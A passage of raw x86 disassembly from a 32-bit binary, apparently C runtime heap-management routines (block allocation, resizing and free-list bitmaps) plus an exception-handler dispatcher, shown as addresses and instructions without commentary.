  42516b:	mov    edi,ebx
  42516d:	push   0x1000
  425172:	shl    edi,0xf
  425175:	add    edi,DWORD PTR [ecx+0xc]
  425178:	push   0x8000
  42517d:	push   edi
  42517e:	call   DWORD PTR ds:0x4280ec
  425184:	test   eax,eax
  425186:	jne    0x425190
  425188:	or     eax,0xffffffff
  42518b:	jmp    0x42522d
  425190:	lea    edx,[edi+0x7000]
  425196:	cmp    edi,edx
  425198:	mov    DWORD PTR [ebp-0x4],edx
  42519b:	ja     0x4251e0
  42519d:	mov    ecx,edx
  42519f:	sub    ecx,edi
  4251a1:	shr    ecx,0xc
  4251a4:	lea    eax,[edi+0x10]
  4251a7:	inc    ecx
  4251a8:	or     DWORD PTR [eax-0x8],0xffffffff
  4251ac:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251b3:	lea    edx,[eax+0xffc]
  4251b9:	mov    DWORD PTR [eax],edx
  4251bb:	lea    edx,[eax-0x1004]
  4251c1:	mov    DWORD PTR [eax-0x4],0xff0
  4251c8:	mov    DWORD PTR [eax+0x4],edx
  4251cb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251d5:	add    eax,0x1000
  4251da:	dec    ecx
  4251db:	jne    0x4251a8
  4251dd:	mov    edx,DWORD PTR [ebp-0x4]
  4251e0:	mov    eax,DWORD PTR [ebp-0x8]
  4251e3:	add    eax,0x1f8
  4251e8:	lea    ecx,[edi+0xc]
  4251eb:	mov    DWORD PTR [eax+0x4],ecx
  4251ee:	mov    DWORD PTR [ecx+0x8],eax
  4251f1:	lea    ecx,[edx+0xc]
  4251f4:	mov    DWORD PTR [eax+0x8],ecx
  4251f7:	mov    DWORD PTR [ecx+0x4],eax
  4251fa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ff:	xor    edi,edi
  425201:	inc    edi
  425202:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425209:	mov    al,BYTE PTR [esi+0x43]
  42520c:	mov    cl,al
  42520e:	inc    cl
  425210:	test   al,al
  425212:	mov    eax,DWORD PTR [ebp+0x8]
  425215:	mov    BYTE PTR [esi+0x43],cl
  425218:	jne    0x42521d
  42521a:	or     DWORD PTR [eax+0x4],edi
  42521d:	mov    edx,0x80000000
  425222:	mov    ecx,ebx
  425224:	shr    edx,cl
  425226:	not    edx
  425228:	and    DWORD PTR [eax+0x8],edx
  42522b:	mov    eax,ebx
  42522d:	pop    edi
  42522e:	pop    esi
  42522f:	pop    ebx
  425230:	leave  
  425231:	ret    
  425232:	push   ebp
  425233:	mov    ebp,esp
  425235:	sub    esp,0xc
  425238:	mov    ecx,DWORD PTR [ebp+0x8]
  42523b:	mov    eax,DWORD PTR [ecx+0x10]
  42523e:	push   ebx
  42523f:	push   esi
  425240:	mov    esi,DWORD PTR [ebp+0x10]
  425243:	push   edi
  425244:	mov    edi,DWORD PTR [ebp+0xc]
  425247:	mov    edx,edi
  425249:	sub    edx,DWORD PTR [ecx+0xc]
  42524c:	add    esi,0x17
  42524f:	shr    edx,0xf
  425252:	mov    ecx,edx
  425254:	imul   ecx,ecx,0x204
  42525a:	lea    ecx,[ecx+eax*1+0x144]
  425261:	mov    DWORD PTR [ebp-0xc],ecx
  425264:	mov    ecx,DWORD PTR [edi-0x4]
  425267:	and    esi,0xfffffff0
  42526a:	dec    ecx
  42526b:	cmp    esi,ecx
  42526d:	lea    edi,[ecx+edi*1-0x4]
  425271:	mov    ebx,DWORD PTR [edi]
  425273:	mov    DWORD PTR [ebp+0x10],ecx
  425276:	mov    DWORD PTR [ebp-0x4],ebx
  425279:	jle    0x4253d4
  42527f:	test   bl,0x1
  425282:	jne    0x4253cd
  425288:	add    ebx,ecx
  42528a:	cmp    esi,ebx
  42528c:	jg     0x4253cd
  425292:	mov    ecx,DWORD PTR [ebp-0x4]
  425295:	sar    ecx,0x4
  425298:	dec    ecx
  425299:	cmp    ecx,0x3f
  42529c:	mov    DWORD PTR [ebp-0x8],ecx
  42529f:	jbe    0x4252a7
  4252a1:	push   0x3f
  4252a3:	pop    ecx
  4252a4:	mov    DWORD PTR [ebp-0x8],ecx
  4252a7:	mov    ebx,DWORD PTR [edi+0x4]
  4252aa:	cmp    ebx,DWORD PTR [edi+0x8]
  4252ad:	jne    0x4252f2
  4252af:	cmp    ecx,0x20
  4252b2:	mov    ebx,0x80000000
  4252b7:	jae    0x4252d3
  4252b9:	shr    ebx,cl
  4252bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4252be:	lea    ecx,[ecx+eax*1+0x4]
  4252c2:	not    ebx
  4252c4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252f2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx],ebx
  4252d1:	jmp    0x4252f2
  4252d3:	add    ecx,0xffffffe0
  4252d6:	shr    ebx,cl
  4252d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252db:	lea    ecx,[ecx+eax*1+0x4]
  4252df:	not    ebx
  4252e1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252e8:	dec    BYTE PTR [ecx]
  4252ea:	jne    0x4252f2
  4252ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4252ef:	and    DWORD PTR [ecx+0x4],ebx
  4252f2:	mov    ecx,DWORD PTR [edi+0x8]
  4252f5:	mov    ebx,DWORD PTR [edi+0x4]
  4252f8:	mov    DWORD PTR [ecx+0x4],ebx
  4252fb:	mov    ecx,DWORD PTR [edi+0x4]
  4252fe:	mov    edi,DWORD PTR [edi+0x8]
  425301:	mov    DWORD PTR [ecx+0x8],edi
  425304:	mov    ecx,DWORD PTR [ebp+0x10]
  425307:	sub    ecx,esi
  425309:	add    DWORD PTR [ebp-0x4],ecx
  42530c:	cmp    DWORD PTR [ebp-0x4],0x0
  425310:	jle    0x4253bb
  425316:	mov    edi,DWORD PTR [ebp-0x4]
  425319:	mov    ecx,DWORD PTR [ebp+0xc]
  42531c:	sar    edi,0x4
  42531f:	dec    edi
  425320:	cmp    edi,0x3f
  425323:	lea    ecx,[ecx+esi*1-0x4]
  425327:	jbe    0x42532c
  425329:	push   0x3f
  42532b:	pop    edi
  42532c:	mov    ebx,DWORD PTR [ebp-0xc]
  42532f:	lea    ebx,[ebx+edi*8]
  425332:	mov    DWORD PTR [ebp+0x10],ebx
  425335:	mov    ebx,DWORD PTR [ebx+0x4]
  425338:	mov    DWORD PTR [ecx+0x4],ebx
  42533b:	mov    ebx,DWORD PTR [ebp+0x10]
  42533e:	mov    DWORD PTR [ecx+0x8],ebx
  425341:	mov    DWORD PTR [ebx+0x4],ecx
  425344:	mov    ebx,DWORD PTR [ecx+0x4]
  425347:	mov    DWORD PTR [ebx+0x8],ecx
  42534a:	mov    ebx,DWORD PTR [ecx+0x4]
  42534d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425350:	jne    0x4253a9
  425352:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425356:	mov    BYTE PTR [ebp+0x13],cl
  425359:	inc    cl
  42535b:	cmp    edi,0x20
  42535e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425362:	jae    0x425380
  425364:	cmp    BYTE PTR [ebp+0x13],0x0
  425368:	jne    0x425378
  42536a:	mov    ecx,edi
  42536c:	mov    ebx,0x80000000
  425371:	shr    ebx,cl
  425373:	mov    ecx,DWORD PTR [ebp+0x8]
  425376:	or     DWORD PTR [ecx],ebx
  425378:	lea    eax,[eax+edx*4+0x44]
  42537c:	mov    ecx,edi
  42537e:	jmp    0x4253a0
  425380:	cmp    BYTE PTR [ebp+0x13],0x0
  425384:	jne    0x425396
  425386:	lea    ecx,[edi-0x20]
  425389:	mov    ebx,0x80000000
  42538e:	shr    ebx,cl
  425390:	mov    ecx,DWORD PTR [ebp+0x8]
  425393:	or     DWORD PTR [ecx+0x4],ebx
  425396:	lea    eax,[eax+edx*4+0xc4]
  42539d:	lea    ecx,[edi-0x20]
  4253a0:	mov    edx,0x80000000
  4253a5:	shr    edx,cl
  4253a7:	or     DWORD PTR [eax],edx
  4253a9:	mov    edx,DWORD PTR [ebp+0xc]
  4253ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4253af:	lea    eax,[edx+esi*1-0x4]
  4253b3:	mov    DWORD PTR [eax],ecx
  4253b5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253b9:	jmp    0x4253be
  4253bb:	mov    edx,DWORD PTR [ebp+0xc]
  4253be:	lea    eax,[esi+0x1]
  4253c1:	mov    DWORD PTR [edx-0x4],eax
  4253c4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253c8:	jmp    0x425509
  4253cd:	xor    eax,eax
  4253cf:	jmp    0x42550c
  4253d4:	jge    0x425509
  4253da:	mov    ebx,DWORD PTR [ebp+0xc]
  4253dd:	sub    DWORD PTR [ebp+0x10],esi
  4253e0:	lea    ecx,[esi+0x1]
  4253e3:	mov    DWORD PTR [ebx-0x4],ecx
  4253e6:	lea    ebx,[ebx+esi*1-0x4]
  4253ea:	mov    esi,DWORD PTR [ebp+0x10]
  4253ed:	sar    esi,0x4
  4253f0:	dec    esi
  4253f1:	cmp    esi,0x3f
  4253f4:	mov    DWORD PTR [ebp+0xc],ebx
  4253f7:	mov    DWORD PTR [ebx-0x4],ecx
  4253fa:	jbe    0x4253ff
  4253fc:	push   0x3f
  4253fe:	pop    esi
  4253ff:	test   BYTE PTR [ebp-0x4],0x1
  425403:	jne    0x425489
  425409:	mov    esi,DWORD PTR [ebp-0x4]
  42540c:	sar    esi,0x4
  42540f:	dec    esi
  425410:	cmp    esi,0x3f
  425413:	jbe    0x425418
  425415:	push   0x3f
  425417:	pop    esi
  425418:	mov    ecx,DWORD PTR [edi+0x4]
  42541b:	cmp    ecx,DWORD PTR [edi+0x8]
  42541e:	jne    0x425462
  425420:	cmp    esi,0x20
  425423:	mov    ebx,0x80000000
  425428:	jae    0x425443
  42542a:	mov    ecx,esi
  42542c:	shr    ebx,cl
  42542e:	lea    esi,[esi+eax*1+0x4]
  425432:	not    ebx
  425434:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425438:	dec    BYTE PTR [esi]
  42543a:	jne    0x42545f
  42543c:	mov    ecx,DWORD PTR [ebp+0x8]
  42543f:	and    DWORD PTR [ecx],ebx
  425441:	jmp    0x42545f
  425443:	lea    ecx,[esi-0x20]
  425446:	shr    ebx,cl
  425448:	lea    ecx,[esi+eax*1+0x4]
  42544c:	not    ebx
  42544e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425455:	dec    BYTE PTR [ecx]
  425457:	jne    0x42545f
  425459:	mov    ecx,DWORD PTR [ebp+0x8]
  42545c:	and    DWORD PTR [ecx+0x4],ebx
  42545f:	mov    ebx,DWORD PTR [ebp+0xc]
  425462:	mov    ecx,DWORD PTR [edi+0x8]
  425465:	mov    esi,DWORD PTR [edi+0x4]
  425468:	mov    DWORD PTR [ecx+0x4],esi
  42546b:	mov    esi,DWORD PTR [edi+0x8]
  42546e:	mov    ecx,DWORD PTR [edi+0x4]
  425471:	mov    DWORD PTR [ecx+0x8],esi
  425474:	mov    esi,DWORD PTR [ebp+0x10]
  425477:	add    esi,DWORD PTR [ebp-0x4]
  42547a:	mov    DWORD PTR [ebp+0x10],esi
  42547d:	sar    esi,0x4
  425480:	dec    esi
  425481:	cmp    esi,0x3f
  425484:	jbe    0x425489
  425486:	push   0x3f
  425488:	pop    esi
  425489:	mov    ecx,DWORD PTR [ebp-0xc]
  42548c:	lea    ecx,[ecx+esi*8]
  42548f:	mov    edi,DWORD PTR [ecx+0x4]
  425492:	mov    DWORD PTR [ebx+0x8],ecx
  425495:	mov    DWORD PTR [ebx+0x4],edi
  425498:	mov    DWORD PTR [ecx+0x4],ebx
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    DWORD PTR [ecx+0x8],ebx
  4254a1:	mov    ecx,DWORD PTR [ebx+0x4]
  4254a4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4254a7:	jne    0x425500
  4254a9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4254ad:	mov    BYTE PTR [ebp+0xf],cl
  4254b0:	inc    cl
  4254b2:	cmp    esi,0x20
  4254b5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254b9:	jae    0x4254d7
  4254bb:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bf:	jne    0x4254cf
  4254c1:	mov    ecx,esi
  4254c3:	mov    edi,0x80000000
  4254c8:	shr    edi,cl
  4254ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4254cd:	or     DWORD PTR [ecx],edi
  4254cf:	lea    eax,[eax+edx*4+0x44]
  4254d3:	mov    ecx,esi
  4254d5:	jmp    0x4254f7
  4254d7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254db:	jne    0x4254ed
  4254dd:	lea    ecx,[esi-0x20]
  4254e0:	mov    edi,0x80000000
  4254e5:	shr    edi,cl
  4254e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ea:	or     DWORD PTR [ecx+0x4],edi
  4254ed:	lea    eax,[eax+edx*4+0xc4]
  4254f4:	lea    ecx,[esi-0x20]
  4254f7:	mov    edx,0x80000000
  4254fc:	shr    edx,cl
  4254fe:	or     DWORD PTR [eax],edx
  425500:	mov    eax,DWORD PTR [ebp+0x10]
  425503:	mov    DWORD PTR [ebx],eax
  425505:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425509:	xor    eax,eax
  42550b:	inc    eax
  42550c:	pop    edi
  42550d:	pop    esi
  42550e:	pop    ebx
  42550f:	leave  
  425510:	ret    
  425511:	push   ebp
  425512:	mov    ebp,esp
  425514:	sub    esp,0x14
  425517:	mov    ecx,DWORD PTR [ebp+0x8]
  42551a:	mov    eax,ds:0x46519c
  42551f:	mov    edx,DWORD PTR ds:0x4651a0
  425525:	add    ecx,0x17
  425528:	and    ecx,0xfffffff0
  42552b:	push   ebx
  42552c:	mov    DWORD PTR [ebp-0x10],ecx
  42552f:	sar    ecx,0x4
  425532:	push   esi
  425533:	lea    eax,[eax+eax*4]
  425536:	push   edi
  425537:	dec    ecx
  425538:	cmp    ecx,0x20
  42553b:	lea    edi,[edx+eax*4]
  42553e:	mov    DWORD PTR [ebp-0x4],edi
  425541:	jge    0x42554e
  425543:	or     esi,0xffffffff
  425546:	shr    esi,cl
  425548:	or     DWORD PTR [ebp-0x8],0xffffffff
  42554c:	jmp    0x42555b
  42554e:	add    ecx,0xffffffe0
  425551:	or     eax,0xffffffff
  425554:	xor    esi,esi
  425556:	shr    eax,cl
  425558:	mov    DWORD PTR [ebp-0x8],eax
  42555b:	mov    eax,ds:0x4651a8
  425560:	mov    ebx,eax
  425562:	mov    DWORD PTR [ebp-0xc],esi
  425565:	cmp    ebx,edi
  425567:	jmp    0x42557d
  425569:	mov    ecx,DWORD PTR [ebx+0x4]
  42556c:	mov    edi,DWORD PTR [ebx]
  42556e:	and    ecx,DWORD PTR [ebp-0x8]
  425571:	and    edi,esi
  425573:	or     ecx,edi
  425575:	jne    0x425582
  425577:	add    ebx,0x14
  42557a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42557d:	mov    DWORD PTR [ebp+0x8],ebx
  425580:	jb     0x425569
  425582:	cmp    ebx,DWORD PTR [ebp-0x4]
  425585:	jne    0x4255ab
  425587:	mov    ebx,edx
  425589:	jmp    0x42559c
  42558b:	mov    ecx,DWORD PTR [ebx+0x4]
  42558e:	mov    edi,DWORD PTR [ebx]
  425590:	and    ecx,DWORD PTR [ebp-0x8]
  425593:	and    edi,esi
  425595:	or     ecx,edi
  425597:	jne    0x4255a3
  425599:	add    ebx,0x14
  42559c:	cmp    ebx,eax
  42559e:	mov    DWORD PTR [ebp+0x8],ebx
  4255a1:	jb     0x42558b
  4255a3:	cmp    ebx,eax
  4255a5:	je     0x42563f
  4255ab:	mov    DWORD PTR ds:0x4651a8,ebx
  4255b1:	mov    eax,DWORD PTR [ebx+0x10]
  4255b4:	mov    edx,DWORD PTR [eax]
  4255b6:	cmp    edx,0xffffffff
  4255b9:	mov    DWORD PTR [ebp-0x4],edx
  4255bc:	je     0x4255d2
  4255be:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255c5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255c9:	and    ecx,DWORD PTR [ebp-0x8]
  4255cc:	and    edi,esi
  4255ce:	or     ecx,edi
  4255d0:	jne    0x425608
  4255d2:	mov    edx,DWORD PTR [eax+0xc4]
  4255d8:	and    edx,DWORD PTR [ebp-0x8]
  4255db:	and    DWORD PTR [ebp-0x4],0x0
  4255df:	lea    ecx,[eax+0x44]
  4255e2:	mov    esi,DWORD PTR [ecx]
  4255e4:	and    esi,DWORD PTR [ebp-0xc]
  4255e7:	or     edx,esi
  4255e9:	mov    esi,DWORD PTR [ebp-0xc]
  4255ec:	jne    0x425605
  4255ee:	mov    edx,DWORD PTR [ecx+0x84]
  4255f4:	and    edx,DWORD PTR [ebp-0x8]
  4255f7:	inc    DWORD PTR [ebp-0x4]
  4255fa:	add    ecx,0x4
  4255fd:	mov    edi,DWORD PTR [ecx]
  4255ff:	and    edi,esi
  425601:	or     edx,edi
  425603:	je     0x4255ee
  425605:	mov    edx,DWORD PTR [ebp-0x4]
  425608:	mov    ecx,edx
  42560a:	imul   ecx,ecx,0x204
  425610:	lea    ecx,[ecx+eax*1+0x144]
  425617:	mov    DWORD PTR [ebp-0xc],ecx
  42561a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42561e:	xor    edi,edi
  425620:	and    ecx,esi
  425622:	jne    0x425691
  425624:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42562b:	and    ecx,DWORD PTR [ebp-0x8]
  42562e:	push   0x20
  425630:	pop    edi
  425631:	jmp    0x425691
  425633:	cmp    DWORD PTR [ebx+0x8],0x0
  425637:	jne    0x425644
  425639:	add    ebx,0x14
  42563c:	mov    DWORD PTR [ebp+0x8],ebx
  42563f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425642:	jb     0x425633
  425644:	cmp    ebx,DWORD PTR [ebp-0x4]
  425647:	jne    0x42566f
  425649:	mov    ebx,edx
  42564b:	jmp    0x425656
  42564d:	cmp    DWORD PTR [ebx+0x8],0x0
  425651:	jne    0x42565d
  425653:	add    ebx,0x14
  425656:	cmp    ebx,eax
  425658:	mov    DWORD PTR [ebp+0x8],ebx
  42565b:	jb     0x42564d
  42565d:	cmp    ebx,eax
  42565f:	jne    0x42566f
  425661:	call   0x425075
  425666:	mov    ebx,eax
  425668:	test   ebx,ebx
  42566a:	mov    DWORD PTR [ebp+0x8],ebx
  42566d:	je     0x425687
  42566f:	push   ebx
  425670:	call   0x42512c
  425675:	pop    ecx
  425676:	mov    ecx,DWORD PTR [ebx+0x10]
  425679:	mov    DWORD PTR [ecx],eax
  42567b:	mov    eax,DWORD PTR [ebx+0x10]
  42567e:	cmp    DWORD PTR [eax],0xffffffff
  425681:	jne    0x4255ab
  425687:	xor    eax,eax
  425689:	jmp    0x425808
  42568e:	shl    ecx,1
  425690:	inc    edi
  425691:	test   ecx,ecx
  425693:	jge    0x42568e
  425695:	mov    ecx,DWORD PTR [ebp-0xc]
  425698:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42569c:	mov    ecx,DWORD PTR [edx]
  42569e:	sub    ecx,DWORD PTR [ebp-0x10]
  4256a1:	mov    esi,ecx
  4256a3:	sar    esi,0x4
  4256a6:	dec    esi
  4256a7:	cmp    esi,0x3f
  4256aa:	mov    DWORD PTR [ebp-0x8],ecx
  4256ad:	jle    0x4256b2
  4256af:	push   0x3f
  4256b1:	pop    esi
  4256b2:	cmp    esi,edi
  4256b4:	je     0x4257bb
  4256ba:	mov    ecx,DWORD PTR [edx+0x4]
  4256bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4256c0:	jne    0x42571e
  4256c2:	cmp    edi,0x20
  4256c5:	mov    ebx,0x80000000
  4256ca:	jge    0x4256f2
  4256cc:	mov    ecx,edi
  4256ce:	shr    ebx,cl
  4256d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256d3:	lea    edi,[eax+edi*1+0x4]
  4256d7:	not    ebx
  4256d9:	mov    DWORD PTR [ebp-0x14],ebx
  4256dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256e4:	dec    BYTE PTR [edi]
  4256e6:	jne    0x42571b
  4256e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ee:	and    DWORD PTR [ebx],ecx
  4256f0:	jmp    0x42571e
  4256f2:	lea    ecx,[edi-0x20]
  4256f5:	shr    ebx,cl
  4256f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256fa:	lea    ecx,[eax+ecx*4+0xc4]
  425701:	lea    edi,[eax+edi*1+0x4]
  425705:	not    ebx
  425707:	and    DWORD PTR [ecx],ebx
  425709:	dec    BYTE PTR [edi]
  42570b:	mov    DWORD PTR [ebp-0x14],ebx
  42570e:	jne    0x42571b
  425710:	mov    ebx,DWORD PTR [ebp+0x8]
  425713:	mov    ecx,DWORD PTR [ebp-0x14]
  425716:	and    DWORD PTR [ebx+0x4],ecx
  425719:	jmp    0x42571e
  42571b:	mov    ebx,DWORD PTR [ebp+0x8]
  42571e:	cmp    DWORD PTR [ebp-0x8],0x0
  425722:	mov    ecx,DWORD PTR [edx+0x8]
  425725:	mov    edi,DWORD PTR [edx+0x4]
  425728:	mov    DWORD PTR [ecx+0x4],edi
  42572b:	mov    ecx,DWORD PTR [edx+0x4]
  42572e:	mov    edi,DWORD PTR [edx+0x8]
  425731:	mov    DWORD PTR [ecx+0x8],edi
  425734:	je     0x4257c7
  42573a:	mov    ecx,DWORD PTR [ebp-0xc]
  42573d:	lea    ecx,[ecx+esi*8]
  425740:	mov    edi,DWORD PTR [ecx+0x4]
  425743:	mov    DWORD PTR [edx+0x8],ecx
  425746:	mov    DWORD PTR [edx+0x4],edi
  425749:	mov    DWORD PTR [ecx+0x4],edx
  42574c:	mov    ecx,DWORD PTR [edx+0x4]
  42574f:	mov    DWORD PTR [ecx+0x8],edx
  425752:	mov    ecx,DWORD PTR [edx+0x4]
  425755:	cmp    ecx,DWORD PTR [edx+0x8]
  425758:	jne    0x4257b8
  42575a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42575e:	mov    BYTE PTR [ebp+0xb],cl
  425761:	inc    cl
  425763:	cmp    esi,0x20
  425766:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42576a:	jge    0x42578f
  42576c:	cmp    BYTE PTR [ebp+0xb],0x0
  425770:	jne    0x42577d
  425772:	mov    edi,0x80000000
  425777:	mov    ecx,esi
  425779:	shr    edi,cl
  42577b:	or     DWORD PTR [ebx],edi
  42577d:	mov    ecx,esi
  42577f:	mov    edi,0x80000000
  425784:	shr    edi,cl
  425786:	mov    ecx,DWORD PTR [ebp-0x4]
  425789:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42578d:	jmp    0x4257b8
  42578f:	cmp    BYTE PTR [ebp+0xb],0x0
  425793:	jne    0x4257a2
  425795:	lea    ecx,[esi-0x20]
  425798:	mov    edi,0x80000000
  42579d:	shr    edi,cl
  42579f:	or     DWORD PTR [ebx+0x4],edi
  4257a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a5:	lea    edi,[eax+ecx*4+0xc4]
  4257ac:	lea    ecx,[esi-0x20]
  4257af:	mov    esi,0x80000000
  4257b4:	shr    esi,cl
  4257b6:	or     DWORD PTR [edi],esi
  4257b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257bb:	test   ecx,ecx
  4257bd:	je     0x4257ca
  4257bf:	mov    DWORD PTR [edx],ecx
  4257c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257c5:	jmp    0x4257ca
  4257c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ca:	mov    esi,DWORD PTR [ebp-0x10]
  4257cd:	add    edx,ecx
  4257cf:	lea    ecx,[esi+0x1]
  4257d2:	mov    DWORD PTR [edx],ecx
  4257d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257d8:	mov    esi,DWORD PTR [ebp-0xc]
  4257db:	mov    ecx,DWORD PTR [esi]
  4257dd:	test   ecx,ecx
  4257df:	lea    edi,[ecx+0x1]
  4257e2:	mov    DWORD PTR [esi],edi
  4257e4:	jne    0x425800
  4257e6:	cmp    ebx,DWORD PTR ds:0x465198
  4257ec:	jne    0x425800
  4257ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f1:	cmp    ecx,DWORD PTR ds:0x4651b0
  4257f7:	jne    0x425800
  4257f9:	and    DWORD PTR ds:0x465198,0x0
  425800:	mov    ecx,DWORD PTR [ebp-0x4]
  425803:	mov    DWORD PTR [eax],ecx
  425805:	lea    eax,[edx+0x4]
  425808:	pop    edi
  425809:	pop    esi
  42580a:	pop    ebx
  42580b:	leave  
  42580c:	ret    
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   esi
  425811:	inc    ebx
  425812:	xor    dh,BYTE PTR [eax]
  425814:	pop    eax
  425815:	inc    ebx
  425816:	xor    BYTE PTR [eax],dh
  425818:	push   ebp
  425819:	mov    ebp,esp
  42581b:	sub    esp,0x8
  42581e:	push   ebx
  42581f:	push   esi
  425820:	push   edi
  425821:	push   ebp
  425822:	cld    
  425823:	mov    ebx,DWORD PTR [ebp+0xc]
  425826:	mov    eax,DWORD PTR [ebp+0x8]
  425829:	test   DWORD PTR [eax+0x4],0x6
  425830:	jne    0x4258b8
  425836:	mov    DWORD PTR [ebp-0x8],eax
  425839:	mov    eax,DWORD PTR [ebp+0x10]
  42583c:	mov    DWORD PTR [ebp-0x4],eax
  42583f:	lea    eax,[ebp-0x8]
  425842:	mov    DWORD PTR [ebx-0x4],eax
  425845:	mov    esi,DWORD PTR [ebx+0xc]
  425848:	mov    edi,DWORD PTR [ebx+0x8]
  42584b:	cmp    esi,0xffffffff
  42584e:	je     0x4258b1
  425850:	lea    ecx,[esi+esi*2]
  425853:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425858:	je     0x42589f
  42585a:	push   esi
  42585b:	push   ebp
  42585c:	lea    ebp,[ebx+0x10]
  42585f:	call   DWORD PTR [edi+ecx*4+0x4]
  425863:	pop    ebp
  425864:	pop    esi
  425865:	mov    ebx,DWORD PTR [ebp+0xc]
  425868:	or     eax,eax
  42586a:	je     0x42589f
  42586c:	js     0x4258aa
  42586e:	mov    edi,DWORD PTR [ebx+0x8]
  425871:	push   ebx
  425872:	call   0x4267a0
  425877:	add    esp,0x4
  42587a:	lea    ebp,[ebx+0x10]
  42587d:	push   esi
  42587e:	push   ebx
  42587f:	call   0x4267e2
  425884:	add    esp,0x8
  425887:	lea    ecx,[esi+esi*2]
  42588a:	push   0x1
  42588c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425890:	call   0x426876
  425895:	mov    eax,DWORD PTR [edi+ecx*4]
  425898:	mov    DWORD PTR [ebx+0xc],eax
  42589b:	call   DWORD PTR [edi+ecx*4+0x8]
  42589f:	mov    edi,DWORD PTR [ebx+0x8]
  4258a2:	lea    ecx,[esi+esi*2]
  4258a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4258a8:	jmp    0x42584b
  4258aa:	mov    eax,0x0
  4258af:	jmp    0x4258cd
  4258b1:	mov    eax,0x1
  4258b6:	jmp    0x4258cd
  4258b8:	push   ebp
  4258b9:	lea    ebp,[ebx+0x10]
  4258bc:	push   0xffffffff
  4258be:	push   ebx
  4258bf:	call   0x4267e2
  4258c4:	add    esp,0x8
  4258c7:	pop    ebp
  4258c8:	mov    eax,0x1
  4258cd:	pop    ebp
  4258ce:	pop    edi
  4258cf:	pop    esi
  4258d0:	pop    ebx
  4258d1:	mov    esp,ebp
  4258d3:	pop    ebp
  4258d4:	ret    
  4258d5:	push   ebp
  4258d6:	mov    ecx,DWORD PTR [esp+0x8]
  4258da:	mov    ebp,DWORD PTR [ecx]
  4258dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258df:	push   eax
  4258e0:	mov    eax,DWORD PTR [ecx+0x18]
  4258e3:	push   eax
  4258e4:	call   0x4267e2
  4258e9:	add    esp,0x8
  4258ec:	pop    ebp
  4258ed:	ret    0x4
  4258f0:	call   0x423803
  4258f5:	add    eax,0x8
  4258f8:	ret    
  4258f9:	push   0x14
  4258fb:	push   0x4287c0
  425900:	call   0x423950
  425905:	mov    edi,DWORD PTR [ebp+0x8]
  425908:	xor    ebx,ebx
  42590a:	cmp    edi,ebx
  42590c:	jne    0x42591c
  42590e:	push   DWORD PTR [ebp+0xc]
  425911:	call   0x424672
  425916:	pop    ecx
  425917:	jmp    0x425aa0
  42591c:	mov    esi,DWORD PTR [ebp+0xc]
  42591f:	cmp    esi,ebx
  425921:	jne    0x42592f
  425923:	push   edi
  425924:	call   0x42455a
  425929:	pop    ecx
  42592a:	jmp    0x425a9e
  42592f:	cmp    DWORD PTR ds:0x4653e4,0x3
  425936:	jne    0x425a6a
  42593c:	mov    DWORD PTR [ebp-0x1c],ebx
  42593f:	cmp    esi,0xffffffe0
  425942:	ja     0x425a39
  425948:	push   0x4
  42594a:	call   0x423b0f
  42594f:	pop    ecx
  425950:	mov    DWORD PTR [ebp-0x4],ebx
  425953:	push   edi
  425954:	call   0x424d32
  425959:	pop    ecx
  42595a:	mov    DWORD PTR [ebp-0x20],eax
  42595d:	cmp    eax,ebx
  42595f:	je     0x425a09
  425965:	cmp    esi,DWORD PTR ds:0x4651a4
